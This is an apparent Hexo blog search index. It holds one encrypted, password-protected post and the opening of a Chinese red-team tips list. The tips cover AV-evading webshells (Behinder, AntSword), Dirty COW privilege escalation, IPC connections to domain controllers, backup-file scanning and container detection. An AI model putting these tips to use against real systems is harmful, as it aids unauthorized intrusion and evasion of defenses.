<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2022-2023年度总结</title>
    <link href="/2022-2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93.html"/>
    <url>/2022-2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="26e438720f508695e80bd7990adf38215225c1ed0eadec0c5ce19a8f27370dc7">b6f03e607dff33a8ce85800be8dd1633e27aefa86ce297febece8fdab0e87e08d41596c75642c00a6a3de912b92f452275a2d93cafa0ab509f5f1456c52b35baf4c0e79c3cbf7147f5e9f9af7af770efdabb45d4abfa5c6f99cd27b169479edaed95061ea09bfa85a24262f54c88604c1322880068126256da4d9962c899a5479d877e8898fcb07ad807a6698ce6b1b36ba6b2c6f96ae4d30426ea8bb3a5311896b1e22596c70d0a6501627cccb2c867013d46418905e8aaae386a72eb7cd830226cf2fa09ec3312133272a89b7873e3ca2f7a6bcf2c9d2c619eacfcc470eea47d1f320360d9411716f1bf774c6db3f72cc60ee4ae2530cdd52c296449b60c61d68190e838fbde432a9fea3394915cb8d3e7cc47a77c58463a539f6d2fe5d852541c124e277bf75d2aa9f4b712176811149b5c87aaa6488764ad1b3d7d0ec1e4af218ca84665742d555e4b49a165958f9cdb4def3300e4427f1c6228f07b1013a4b561b040f23a4d4389f3a2d8ba649aac84ae1f32c7b92b15096f44c61e64c65a441176fe401f528b02455dad2a7a9568c2858f48da9065ae318b1fad1d64ccaf54b999f82ebceb87b1f70aee651320218bfe4c7af287d05ed29a07ce143cca6691369d3ed8211a4e4d2cb7890c9eb0d5a14af54edcc991b419571349168125a292f6d8ad6a4b1c496e2fb857c8e245d4fae2270af432921195fde86a39474373ef62506a0122b38b0ddbd483eb050599de4d564505ecf7d58474e71e6d6c372a3b3fcab6d792e590c41a0d691959872c3fe54147a2c87b4c4f4d2b2392b55ea79759103af3ed47c52dae6da9286e36219c6fa32b7ad0cae3306f03b04796ea32eea02d81cad282aaf49d042d0547b69c33e831e73041c4d7f3f3cafb1b2846380446b1986ca6372ae126e218a00f59f3756a6491effae236c4855d01550b9fe60d1ffa9f1adea0da6cc20d148a55f2e6f0675a962abec1573a5cf5355d1ff04f15590ee7467ae5870c0fa373b1be4c9598a6b23371eab64ad6b6dbbf58ae8e6715ad2b8c2f5d21052bc242e8dabe33d3955f51b3f3b4d8abc9307fec735eab0747c5de49fbe019781b4e89d47c5276843239e18e75655ef64db4e8041fe78553217fb175ed88489318f67d66d4cacc867fc934f0642205cb3657fd48541c2636b5c3af6f5a27d002a55517226a7c2eca1c9ceef58d9b54f0be32e47ae6543febb000e65e69ea9b9b9aa26c111f92bf52a59136b9583d28ad7651cabeb9fafc1ba50cd998b38984e0461fd304b42085b1aecd3f5323bf935c459e480ff3ae3f3a7f71bc4416fa468d98e2bda86fb1668f30d3c82aca661e86834226459763ed1f64e95d84bb8a95005118ccb28ea694015ad7b7672631d16a7802ab3fe0854bd12d5ebfa9ec98297a49faecfde8b54e6072ff33539ab34e3d803721862c036262522d5f7a0d6e12ccc2be81a6e0dbc71c1dda431843c1428ee4cc96647f0d6510c7b79a1e047b01238afae6ff1a7b4c1db0f484e1d0278c432692280bbeb4aa2311549925e94d03cf39d091ee328c757f7ccaf700b63bf2a6d8aeadeaee080a94019e9ca5db1a01b2dc192cae818a0b9aef58de9be16853310d65db69dd2021a60d28be6b06710b12b25841c6795c88e263599bd0b70e054f286ddb29d1d4a4e1c82d776620cd53b32a70a37d28abd6d59075760bad254e9b7936fc323a7bb548b8a7c4b22aa47417ced89b73bbe268369887e3cc989bb566e29190a0c66694dc88fd625eb13608f407aa36508ea8cbe2ecaa35042350adb6b07a484837efe2dcc51b5917c25ba752dba893a2dacfa3873a44afb59fce6ff7d7a7f7e2886b4bc82d347c00e8a6b8a685cd61a0664fb9309c77ab2b921a82e0c8066e5865bfb945685d3dd3e1e41a1a90e4a742a9c3bb386d1f1adbbfd14b8219e5a23a330d64e923ae4951848cbbdf848bb52ed9964b347d2a018894d04363062627ae8df6c8a88e68cde21dae8c6e509b49c0db78f15dc99dbf34cec26ada2618edc7bb143e39f0c70743dfa338c87c3cd0d0112d15be31fdec711ebc7222b088a33361838550dd429a024d1123cf4b34e206ad3221de3f9175282ae2a8d741f53c43d2d2f300cd001495174c5b252f9cb9956fff2a2e731a9e6797f5ad72422a83c6e9144e524296a2ea2becd1df1f43e3051fb9454e823f50758b51540fb4a534509b5377337d333191f079304809cbe5c25b3db884c87dfac33d0fc5d8111448bdd815876684113f16049ecbae1d102a1db33c136c854d6fcffa3309e6c32d129cb30815aef7da0a0670e70784a374efedda5ed800d10950e8a78845a8421d920c9d25b246eb98b0a7709c155bc83adbd3deb2b28f053176b31ffc2981d8d03016f31c953f7b266b1f77e2e8172502087537c85fe1789d8c98c57c1e0e4d56a83c98962d76ef94052340ab13ff5b47ca76382735913792d7cce99a6f8862e23f29e8bddca1a403caa3d6e18c5802f87d50e4be275e24f1bb1a072076919adf8ff711e6956b1c216b91d524509b4a496ff6dad350228c827d9c53a6f7c70de110af56e03aad77ff1aa550b601f31b218a2cce2136ea6d6f4e9fc826fed8e1513a319dea067eef598555c26753306193510dc36cefb4d82ca77d39afeb61bcfd4974384f3ca423b5c7fff75f8fb24a6f95dab6844b7953b0cd67fa4fb3000e7fe636fb754fcecdcb6adf84d1f9cd1a87fa3a8c77aa47d730d4316ac909a66d04b67ef8fd38ae8bb1e9f862b5efd300555aba7c3aca22f4283e33f2d312978a5f41ec4a3e8a5d6705f59979237a10b906bfabde6c3325f2f964be6f996ea4127347fb12f65bbc762f3e97bd6f18b54f5247427c26f9d2e6e072acf93bcd5e2c210895e118858e115dbc7aeb1c893487d9f2739952579fc7370c1e9962f5e2b1bbeacd470ac35248f4c563dd864ac9ea7dde5517973f14b1a7a59e48a9fbc493e5d498c4d61d24454bc48c09bb210cda2134da0415b8907803fe1a2646494f50185d1f9e6d0dd72c5c0b05be9d9cdf6b7b637165ab7c141367d16aa6ca4d84b5140a745eeb505e759c86c2620c26184d738e277c95e7c7ea4d0486978301a76f2aabf98ae5beaac870942b1f780ed854948155bf7be80047ed7ade36293b9de93c03d10a279cd8d5e0d94f8ae200451edad48c0ccd1287fef49c4b94ec8499ee0dc2cb4c93d67e1ccb31d9522d1e115ec26295dc859b22bf384102360bb077af47529dddac2c4f6b4c0d05c089e7eeba5efb67e1adda000a67d6fe39fd624dd6cdb9ba2eb3bb71de04800f1e45a9034ff4801191c31ee812bfaf350e2611c0b793307f248e2dabe5d78d1f65b6518adc39dc21bc3b075f54090bb47fd414ce24016b0ac0068734dc23baa376caaef416860154bd962958cd442130677160827b50a84b1858b70af2f3a301ae401026d707578605195b2ea3f4eea512b1dac0aee0b31070b21bf62c086e8ed24c4738bd12ec6305f0e86b9fb27d756c0de8dc3d162c5f2aa64a6755e05f576313103d12f996118389d11b4deb987dceb846ea1ae412f02460a23a626f91cf9fdf567bb8c8a2fba5d51dfedb5f874e58512bfaf743e5d61c622d10d429cb76e5721204b1cd5dd2d525bfbf6eee011b3004856072a73828a9a760b68fe903f6459b03687fb2fed8491fe51cc4d4bdbc954d9d4890e6d5172cd79af2c054d020ed64da8b4d7abeaddf59f710eb1a6d99a561a3cd72b751fe2ced90955bb1fbd167f73b3bc44abe014afcdca191878ba40b33653a5c78cff9bd32877e9451f3b66c0d70951f1c6ac4aa61bba8bbdd4217587575a43dc3c23cfbb1b5add0140de88ac085b99c884d3e53109fd986b507fd065fa33be7a3316cc599fedaa4891612a2ecc2533b09b58af8c670360cbbfe07b83d34a58d3f39ca8cf032053c2ad3e1223bc0472e5231398b3df104efc0c01786fdc6e100d00f9706df8878310448e75cc48ed36224ba4a0f84e7dbd829dfedecc2a1acecddba5cc7a4af52f50a4bbb9cf01c285a46c367a9b562a361a5951a42041c76f9dd26aab0338aaced8893d510fa976b4dc3419cda32c8237f2e03b4c7f01b2c61a15ad1f2bed9d7e52c0a61ea5801701e1bb08c0c3cc6d2a87ed4a8ea4721380f2fed0022bf325790914abcbb148eb0f3255a2c61042743e448f5cd6563fa4022103326f27465c7d016115a5390972c43d5ddbc509e32b22e6885e54ca512d978141f4bacea25849cc030b9263e5d6f3bbee113f5fbc463fccc25f05664a7d3b119866017106e42a14a1419f4a9c8b12364f398541f5f24ec9530488659c8ec04a406cbc15554c9cd1f12439d49b3f5e84e5ff4c4ca85f8c16cb6b67addd5a0d6f42d812510a55b27619bb2fa3b8559e919624e69c951093df6e726a17b7f11cea6e9e17e60335f31ca3b6959f426147cde1f87b53e64214fb88c4503ad095a122a4b720482860d5bba5d57604bfabb2a7e07ea01f033133c8de9f6023b10911d5d74d5d52776c5c977f7951412ed626119c8897ddcb109f9682be653e5c6efb6abd0a03b065d737cd17ec65b2c005deb84d07aeb0982380cd53b819ae6a52a85a7aafec27ea714ad3e3de351a4f91e1e53b036c3b3c1d22a3bc04914bb9ecbb4e8a2feb42fb633b80e3fba7511a8bf530c8c0484f6ffcc3edb4fc7ca36e341ce37bb89c9062df08ec168a94810be8c805d6c4fa3f70cb1022f5b376d2211c438fd0152b0c4db6eebbe93befab4652bf7e5fd1d36ab6a9dadc92acc322d035e3df0f000a76f27e0faa101db13842b8089cf2443a7712711187fd7c1773134cfc9913956030cb4afd74937f793826140164beb4b77364e03704562059fa726419e256f085e8c348fe00bec4738e967e810299f7604889bd1794a60cef2ad70b721806275a1e6868f5eb3d97ae5d7260d22d5ae9ea59311a6dc03a8546d4a4f3434e6dfceac29f4f5044822069df774d074dcf71206bfee05eaf9ca3a1f6b632a1c439b4129a028b0472271fbf1c4c437ab287555f8069592e054db35e5079e40d72b6f48f173ae903e9ae746d3267c30e49f19d0ee4e63db3cf1ad3f0b6874fc01621e40d2bc6ba911f37feb65b826cece03ba5c7361c04b91fe61adaef7421bd57bc7bf7fdac26384f3ccd258b507208b2d0e60811291512f0516b36c4dfe18605131064e0e6863ab6e14ad007db640df7ebaa5ebc1d503dbfebb9eee45dd7791bfff0df896a1bc0f1577ad24fb631bb3c4c23ec04c8ff0ce47c8a10084ae267642133f90881dd75e2c3e912027a09ab46b07a4ea5990fc63d633476d3eb2ef51261f0344a5dbf7b98990a4d308be708802f914579d1d59e91a2e920b1903399b54e164fd2b5ec299278fa0e068ee0216e1910de226d57308f26d570c727fa639a4e9e0aa464bd81ad78445aef32d4d3b3a4701ff1179ba5e5e1629c5b6a825b9c3f4210d75926c9637a20d2521f4a5cde7eb9ae3cf2e0c9188ce4712848a2270260849341f10b3a46e766ccd6ea360eeee243d80649798533ccb00f35d982eac4225562e3d733fa99eddc95062755af154389d04c1ae8bea07ca3b44111015db2f7ee03ab4e40bdc614b39be7111b9418c9446f1e41ed1db6988839b38ab30907477b2c7769f765d1764fbe652bbb03e3c71b01bf9f3d202d29e0da4b467ab045e73020df4754eae2af11b360d1c19f91c84e8308c815b75afce1b892d44c76035830bff24208ca015537a0e29125b6a7b2a9e24c2f49dfecd289d5735ad79e40fff241cd409f9accb778539a822b73f3f9c750a548ae1ded40f634a26bd5a438624d85f387fbcd5a7b7dff5a96c23cdd2c3176d9f01f9ade7df65a543cdee6f827423a981012f10e78838fdd5f16626626e0e35d757aee69f4dc9988f059e45f1327c7a3103bcbc3becaca921178c83bbb5067d73433f4a1babaa6c1725293485e602010808306515ea60fa5116c19f61512e5a250fce10959b61fc1c583bd9896ccd923ed453427b90d23ae4842cdc9c56c26dadeee048dd6f9368b18b7464d0435437e85f132c7049c4b028db18308802e884a74a332c42a2870eaf4b870d95f19c543a217777da3ea09d8912fe822c33b893816f88228807b8c7f93b96c8af932dbb9091543d167ca8e2d2360b44ba2a7976c997bba4f10a8d47d5c579524347df9bf668cb0583cd6c644eba895d62c7f60c30936fb25fb7d8a7d7a0ea550af127650475bf225e19c074392dc6c41e4eba5afe0a7d69e7b17d09e401d9663bb5d985763dbd296f63b3ea7e88c731ca90a99fe1f1d9ee6f122157760f7a6430630328f520218c46f65522f73600586f01dbac62ce6f945826d8ec016d5c6cb6403fd8e019d604f8249ac525af9db785d3e8312d44751ad0f6c2fccb76307583f5664214a5f1b6e9fd838c77bcd38f027cc2becfc0134b57bce67ef167aeafdb4d2b8211701e8558a70cefb597e9aef731cc12955c9f56fd3c2868880937bb2a8a05aefaee7a696c26108f29d011d8cdee70a83096f7fafb4e83ba526cc8ca597efcb62d8bc7d51b1467883463b3d6dc22d00815d3f741aadca5c702b8740220b747b768c00c78621432bf8dc17de3ae5589201fe632eca3cab2f265a32c113f1aca5c5e9c9548fbd0f10838affae3fb6ae7374ebdec736cf58a2a1a68ec91717ee7dce59b2ed48baba55687407b34abcd59aaadba0b3bbaa2ae2ef4e79804b6b45506244f275b918240e0849c9b77c0e2bb211603d89b74e0c84cc48d735b48f260b0984b3372c85bdadeb9e334f576651a1c8f4999f3fb86b882a23d654e6907ee8a00423b1c811f638c8d28da32f7ec88a75eeccef45d05c311221d88b29e7edcd10500ffad6fb6ffd8bdf7987f7d640082021d91ac7c43bdf24b0ba74ef1efa55d67acea9fd9d360ef3a0797b3d05a710607652608a73440f4a7777de01bd0a2dbee51e385d7c302a709b0d631f99e9a8468bf525a5ce60a735a5bccd7d1cd9e4d28a7fd4e8264039bd9f5afb46b79dd6e7c0810ff28c2518edd22b74b88e1859742196786e0305d64c62c921685555243d0f3d7a4e49945b7557c265307b2a28a8f9aafaaffa9bffca87bebc8a5df9e77300ef54a45a337f81bb4064dbba6dfdc635f1535d4b4c2788ea6624d032b1a04d40507628d321a6a61d3fc4c176eb4b9d61dc2f3fc3d9326a248fc907678f099ee282f1db614546f1618473c7e1e9fa9e77753a4887f05605a0c1ed4db29b42406b9c08fc273aa6b5f1b20b89bfa707a5003b0bcf893a0ac59809fcbc297e6fc14b25fce3dfa0d91cdd7128cd6cbed958ed14e3a256336c0d35f8271c7b31e5de3f8c5f7c9f0e2db07c7a0ac9526d6f804bcb4d57b843a5c443a1b6add198ae8f9608864264ddfa5c1e99785e08db545fd7133a7f454438765cea7d63b65b02e0b732ee94523285a608615c81aff176704a1ec075097f0b723d691016ec77c1997eea4f4272d2020b2ad9fb4c5c13c96d0b72608e91a20b8b9fde98d87ebba13bc5056da9f8060c54d46465100a23e4fdcd9b5650f8e5bdccf4a2781b047322fd601de0b659e0c57379eca309cae4dd8edc3a122acd122b35ac499246998f3823eb458c2b85db964b8ae23f31841d073a36def04959b3ed1d0bf7a89bcf149bf141e03ba1942ef8bf0ac54d9e09176f6b15216b2f3d6845f2e1ef2f795ed6cfaddfc2eb5e0155b19522278d01e1b6413466f7084dc6a544f2abd19838885ade4c45ddcc38d226c491041ce30b8353ff75ed8fab686159cc5310dd9813e16279698081ef9fc9b1ee7740149c939f43a02e321abd5ad30cb540001bd66f4cb72dc68f256a0a61b5ae65b9e1ebd09eb7ee9f542bbd4fa9cf57a580cbd6367e26200d766e1fa696d002fb469e1e5725ced4b2f7f35e245a7b89cb44aee060d523608554624b87fbb23826678909225bb0c8bc626c1a369cc95f8365b7f5d734f6de13087c65a53a17baad289931c025df7171e87126fca4bd460209f29f7e386cf157f9fb8b0dafca433d45cf773a23fadd2bb22542da61857e16746c8b8c6a82d88af65c7258f8abed404a560556f6f4e77cfcf3696b43daf5be1125080ac12a829521e3d74245919d717e09960256f96a289445a5da49c1cd9a581d050df88c38fedf9ce5480defb5f8c27b4505aa950432b9e3ef72a04b418ed075988109ac0bb757809ee4a0d97179044e1c28610a37e69096a70fd39fe98158187f9f3529f256c41c12235cdaedc898144ab4a9cd5415a1d87facc313edefd0d8f5f894a04a66ff15f2a6c844e789f64d4d07d1f53dee90deaba45b2e2c504f00bc9be3885a0017e92bd8879b1fb9c38c91d030e6094a8b87616976ced59e4251adb66894fa9868cf4e635e31fab59cc5b78fe830a23a217d1e1bf19b6b56050dd0c457debadc2007a91a5ee1b8ad4f32905f2b1a49dc01c3a7f99b5cf6a456d4a8ca86931c1e8fd1c513b8ca5e4bb2cced8681e8777402d99d9b24b93060f2c2a437ae224bbcec7429ed1d1133bc459e5fb8b25dad02a146fb65f227ed623e04347ebb6adfeb7d931b7cb55c190d19ee660e18a8fc712789de507b305397dd6a22f72743d7bfa72cfdb20391ff0d07af6b5d651ff39ef1e3cf98651b3412c84e3e931830b1e8089e9aa7d08b58fa19d98da25cd8be80be11c9c2a1bf7b1a8e38b3117583a15caf3296e8bf4411ebddf028c361c050445f8bf09a3cf51c4301bbf2a07635955b56ca249eabc3e33f42b926fbdb6ebdcea5cc05d7e437de6d43c5a4189c999cf05b60b5babcae12a26809a6991d513b4d22303f412d7ecc304d69af6869710e884bf52417d9e18f8427c4fa4be8bfe5b0056139735f8e2d33b6da2189846482fe378bc0e51e48fee2ff62bbfc4e852e30ce42a562cba10226a06a64c5f7a5d6ea4cdba787bc7462c4b67bcc936df78031c43682fc79b1181ca5dcef3e52df293df3c7b005b710c606c6a0dc8ad6d6507c871c8bb66f28edab381e7762f4c69d8e009ae45b1942cc91d820de74b6ca061977650127db9ece7811edb245360cbf9e4d4ce12d9194046ba241a58445abab5d2b2f3ecfe7e385520b127ae521f84b52ef6994eae50027004cd411f0112fcc93df5bfc9653b2bd66fedcd68ba9007ccb0fad1eca23b3e74f8b76a77f825161de375d48941b404054befee1ab7da9e7f697ab315b19d6a73f069471499aa11797b9190f8d07529d0fa072f3d1be3a49a4e3aeeb2937ac3c57ba4c831bb13db5e7c6d5c630758f15123d301d01ae56edaf992a707737bf17a28a9191fae7bcdf0022582cae1d4acd5cc68d6937cc8c8ad3cad3a0beb634a42e09205742862280a5915fd9bb352fddf7c381b102253818c0ce190a47be6d18110a1e2b5de7063cf8e962bad72190cf8f807711c8397361452212121133970bc2de32e6d5b6f18bdf5b2d14233eb6ac6ee4125e592a048e2c6a2d67a762be59ad4ad93ac9347b60a7475a7e252a8a3163c4f3d4ed914368d1cbc219c04c7979d84821803d86f95e38aaa91a09299fba0b020c955a50de28544e258272067af6c723329b395c01918eeb1593b72da57e21ab727abfc39a27e23893b2e606ffe6af1c61ae71e398e0e987f9b677ba43d6e045a9f7e2c724506fd2b8a6c49ebffd41a1581a15f7cb57f77c8e08f375c9c9650cc2f6ecec6692ed98431c79b5cf0a8be037ddf4d8fb71676d580b32a3b9791b0a123cb802e0c293de8ecfc99178b915b81bc8fb89a9af4e9ab7c092911a7804c8b72a34d4d70c5346eb14ad27ded047d19ba84f8eaaf98a431c45672abf7a9bc083e876dd64b0e0a2596578ac9741b6d3687feee705d7e3ffbbd0c0328485825cdb1659e60dd51237b98bc6a4ed598047e2617bc1e1b21a2074ea5d557ccb08930ff93f26c8749d7da9549e40b5aac0cef466a73573036c658055fa8794602d0d1b4c4695150b7cf43182b85deecb88f27470aaa7b81bcfb1fc6e796d5e4cc72b1cc207d7c6ec49388be8926d1fcb6f635e55cbb5bb94b6e663daac12fa767436c6196749565a1390859f58e993dd80255e775eeb1df065fac8572ad2b63192200e26a0a89ad8c2ee5851348177676eef61d85dd7d4e340245be7978d4bc48fac5c3e494d055849f5996fa05fc7d8038a422079bcacb7be086da7f063d31267ecb9457b0e5c520064a6806f75e07c27384d2bc2867dfbec09bef0adddaaaf32ff1d906af3714b1104b526d8eb917dbd7a764f49ddd515283bdb307abed24d1c17c956ab14f45c8e3688702864b539966564f797f786f86c208bed7ab467d805bd77f7699765193968ad9dec7a2447c1adceae4f8b559bfaf44b589917c550f3621c4a0761940e8bffee65cf2ad4bf6373b6ad7943b5c3f317d7778d423ff38b0f0c121ef4de28bb3cad7b70d0a84c92fa5164d984aff6525b252504a06ee7ec1005d0fcdab7322f4ac90f24507f2d9e8759761aa71abe6b8aa4ca4b9d886cd48aff0b31e85d9193817e1f88c306e10f06e66a406f136f5a3cdb22869ba7c091f15864c55963556e28a8b21f033b868e5700199a5642be5256fb0e4f52d63c4f6c9effb99de1b119193c729265e73c5978a60b5faf6e383ff2172652276b11d53d282349a6014f57fa51076939262c06466906a0b9c6482d33d9bead0f32c33d9454ebc7c991ecb8760c6290086bccaff39bda463136729b61bceb3deddfae78a6045950bc9eea374db59a5a21f654b06180905464842b13d99220a2f0ebc4cd57f3f226b20edabbd852c2d7c123595e9921df48a70ed4aa53cbe078d111a0689d2d6dfb6e433ccbd050ecddbc801774be5728caa36047077f37bd34bf4ee9469112b4d60b6216d49af8fcf501f5092458f3e11dd9c87b8ac79367766182a7ac2ec9028f56e6453d305c8b13113d40da8fbd1d2ea573a3ff8a0ae31cf500be5e40932a378c75050ae3986c3f1d7bb7487b5e657f1d0672607327d37e97c27c5c98dcddbbef1597b3fd9cfdaa33b0c15dffdf45ece787623b1a3c40d6268471ba6c9af0ccb2462b03a120413eda644e1fd66b810ce4c7bf088b6d6a7679f2dc483c0f53df38f2468e873cbc6996f7303c84c24cb73bda1bf01c4dfbbdf829a1ee1ac854dc8da2f70b1d070238272383a012c33e3d80476f7ccc31c5f060e6f98fdf559e9c89ab670dd1993aeca7d6673af3551346c9e86f7cf4dc9b8c1f581dda0faf50583f449e3917afb8baf6362cd36112813a930d3fd193b1dce4ccccf3395d945054c9c881f7d551645752402cd088b27742fbe2437ef4c6e4a4c39f5dba9d6a8686d8158e260969f52a4413616a1580ad356f357e4109a0deee836465d351782174cf77f36bfbd7fdf3ee2cd7de3c0993a1e8edbdb341e8eb5fd0a39594d350733dabc15479e804dbc63f3d478b847f3e9775d2d8c735371584156ebc1ad8042a35c5c05c027970943ec05acad375028fb3fcc5acf05a5da8743e1530b1421ff14494fabcafc477e51fb58e62d418c0e93f73bb2b8eb6ccb2124e74c642b3391035322d0d19d74725ba7641f3f2cafe221216cc7242394f75c5a742d2f67fb0cf47840f3ca6f060f73fd9296be620fc60f333b5fba946bf289ede992901d1b4f85c084fba9196f5aef69f7bf30029ecca61d09246908923566b6ca3350892c5c0d6d47ea1f2421fdca69ee45a5d3ca3078957f21d3cfbe32b0a5d1a918196f58a0c43f57ad087be8b6d583e82e275d0921b0952fc3e369942b0f164514c3c6e34d30dc478da5e6a31618ba532bbcb5040e567e9fcad0776170bbf31c4ed5d3643cf38ef4f840c452dbc95f0af9cdf0a6a8e789ef95a58b680f76842a3e533b41241b5a0591d2e59b3e245e862d89ed1502269a6daa4d205b302b7a6eddb59894fd6e44e00cbab8776f844c189606c438297d3dd78d5ecf27cd5eee0442abb2588e86f12f0191449b9f1ea5558d57381c51307f96db6071965699fe30c9f2ee0f972bd44398b71aaf8720c79fa44582d6513f663f4f3dbb41bcf87bd50e1307a799623cbc904c5e3a0518ba76b510a2bae1be1bd88319b763c45d09c2923f22b0019b4fa29e0bfd45a4c35f2b3eb57215ade983a8cbaa8b3eeffac7838da0d35cb5ded1d2178c8bc241c7bb6e48c511383723917d59718f4ca05f4c476a7fb312e46ab74e6510701b8980d4f998a879237a78ba1729fba2f09de42dda07519d69dcc973368b2c26d0322c3fd1ffbef1eb1b68158827d86536a1ccdf39eb9b610b6e35295e2fa72f820468e14348da780af4a8a22bee436eb83206b47566acd2bce9964fa69ecb05c6a0d1f523de5502ec089e1b5a14cf6d7770af0812599d927140ee3298f4ca83eb215c08bda94d4616e167057b567c7aa1910ac6ac064970050f1c5928a3accf9a974edf945bbb820d9dc54678a1208a4ae0665b187fde1ca47fe7a1d7dd6f0beea74df616f60a9e7b089f579f27bc8dc2c1e9ac94a381e3fcba711d455003582a913bba710cb0dba94145999ca38eb412a0f48a629792eb99f96215003ee575bd5bad2b129e24d4a0356e66652b93e771ee44bf985dc047224f079817d8d69a3a462e31578507886723fc227a467b50235f2ccc2a9121676758734bebafb6bf2cb8c3a5390e863a92471ece8179f48e9c28afd0fec39c234d16020cd96a6a33031618c6c957752e18d77b23b13a80b32f8cc7b8ccefe85390119cb33a0b9753eb055fa9d5c5eeaff6780023e03546cbccfd4a4ffc7f8eba68ea1d064e83164417d7c7142ee73db3f7fd51a58921ea122789f776840ae98a6aba04f486d42e0d8c4a96e33ad41b26d138abde886c001819ea9db4e3f6c08a9865aa89443ab47533a67e685f7fd7c6eb72e07177bb8f5f1db545a03067302a4e9696c38253e442ef02e4003082528b595a20c72de4505f0ea24bae85ef208a2dd20ed5147ddf6a0782ca0f2785eb6ea32df334d58e68abd40cd2a434f269905c040b56bdd0732d95956abc67263e8d5d41e9286f28c1725d9686d20de4d6e56ba3ca5925d0d32c8afc7e42f16cb9fb922be9c920fa5adadadea58988f1f014bd1a2ff85d7637052f4c4f406dfc09a4319331ea2a1f378e80749cf1e5415b628908a7416f1ed256442c6fe6ffaeafc73d1cbf88ab02b5a4a23931404202b647c84f4bb861e2e187f2b71c172e46a48580f7242a390905ce72d9aaacbdbaac657ef57803187c0593ac41de0eaf440b3b287bee80f8745d6ba53c34fa2c781179c83abc4ebf093191dea9a963324d4591dcf5458d7caa701609fa2d720504fbfce6ff6027422fbd6c2aa520986861272017ed814b394701075ed58accc4a67fe692bea609571ad962fd62c6942e8b2df2aa2fcd36e38c88fd0a22f455a7d92f22c38563f543d1084ba2dc8b96d72fb3a921c02c528223855880a466e8ce995511fcd7df63751ada628c96d9a77e202571adfa9def21b00c10f499d184d1598070e431e0402207121e51e9c3a0b5596f7447399791e6e92276e447a1e1a1fc29193adb0261a32378a71c7d741bc9b45124e4182b1340d9b563f34550c9d42477063c0933ef9b6843fb15e1e588c7be93907d234794c49d086a34b53b323d5cb8e01c60c31528ba053f944cf3207e3e6e39eda9141b49a66fb9bae2b3c041a8b139275fef0b77e818f58d99614803fa25fd704e9eaf3106f82a2154337a589c04bb935c6db34c33c7b79bb596f5ffa8107593bc8d424668728d7f5aadfb4cf1f7e2702469ee893956896421c554114b445ba9200691518a1fdeff392e38655ccbab509f59d083f3014d044e6b218e619a2d89313e6014e8afc84d85ef1b59811bab4256cac6119dc1d873eecd16b3ded27082a27b0340cb37b89194d941a02f9dc965f5b32befdf25028e4b105d22bd4b61639940a5ea557cfbb5f9de631114a208f8702e126007b2b706cb44d2491b0c90962c1039596ce71d91b668eccd91122c5e04407d9da86e720989a26ca78534114cf4cac6059f4fb60d20d0cce12ba4d9b8b71e1d8ae0d37467937515dd2e37cd7305560ec8ff9b41e05262f07a4dbba24a462db6e51d0d0b2cd2f901aaeb46db6a53eea2ca8add5a435d9ee852388c2a80ef882941c16f332f32c0d279cea6ed2a4d088f30efd89608bfe19201adcecdd3b78b4c7c7fbef409b2bf20d452cb72e7af77fb0441d0c40e78d543607be395b1df3f0ff1ed16799bcd4593e6fc562d94b594e88e9d038d2e67ccf8ee99e6a5497b7fb93bf9717cf2449c1cfcfcb46f0fe509a685ed2ae00d9e5dd97c5beee820a66f3d88f57c07630b0b3c179a913f953cb0d980d745338ba85c1881e68dce10413e1573f6dfffc4a178266b56bee43427ef747be8bb8df46c17943a908ff088a1dfd27fc8098f2d21bc455f1c38d52fe15908ee7218ff24e85d983eb08f9d39853d20016198a5481342bf395f18795293ca67a538ab145424034e8f049289a6cdb22e6471144c75b729e0b02773a0440c003b118c2326</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人收集redteam重要tips(2000行 51898字符)</title>
    <link href="/%E4%B8%AA%E4%BA%BA%E6%94%B6%E9%9B%86redteam%E9%87%8D%E8%A6%81tips(2000%E8%A1%8C%2051898%E5%AD%97%E7%AC%A6).html"/>
    <url>/%E4%B8%AA%E4%BA%BA%E6%94%B6%E9%9B%86redteam%E9%87%8D%E8%A6%81tips(2000%E8%A1%8C%2051898%E5%AD%97%E7%AC%A6).html</url>
    
    <content type="html"><![CDATA[<p>由于是NET平台,可以先搜集以下所有相同系统的站点。然后扫一扫备份之类的。常见的字典如: web.rar 备份.rar</p><p>不能使用默认冰蝎和普通菜刀，去找一下面杀版的，蚁剑 behinder<br>Nessus（系统扫描与分析软件）<br>Application.evtx文件—日志分析<br>仿写，抄写脚本<br>同类系统查询找漏洞<br>遇到url的 forbidon 可以扫录试试<br>御剑web指纹识别<br>源码中可能有后台连接<br>使用ipc连接域控，注意这里需要用主机名而不能用ip<br>上传jsp的shell的话可以直接网页输入命令。<br>一般情况下往png后加个特殊字符能认为它是白名单不能进行绕过<br>反序列化的真正本质-类的调用过程-涉及java classloader（类加载器，利用java做框架的人普遍得学）<br>多学英语，国外漏洞都是英语</p><p>linux提权首选脏牛提权<br>高级mock是一种给服务器主机增加协议过滤ip等（通过脚本）的东西，那么也能够在高级mock中添加某种脚本文件来获取系统操作权限<br>定期刷漏洞库</p><p>在线力公系统的稿件是不能随意看到的,通常也是需要登录才能看到的。之所以在 hadkbar 能正常输入输出,是因为 Firefox 有 cooke .菜刀是没法填 cookie 的,需要到中国蚁刽,默认蚊剑也没有 cooke ,需要自己从浏览器复制进去所以大家在滲透的时候,遇到问题,可以换个浏览器访问看看,一个是因为 cooke 的问题,另外一个是目标站点对浏览器的适配可能有差别,导致看到的东西不一样,也是会影响到最终的渗透结果的。</p><p>fofa验证 docker 的两个小方法<br>ps -ef ：docker 一般显示很少的进程<br>ls -a &#x2F;.dockerenv</p><p>RCE(远程代码执行)：是互联网的一种安全漏洞。<br> SSRF(Server-Side Request 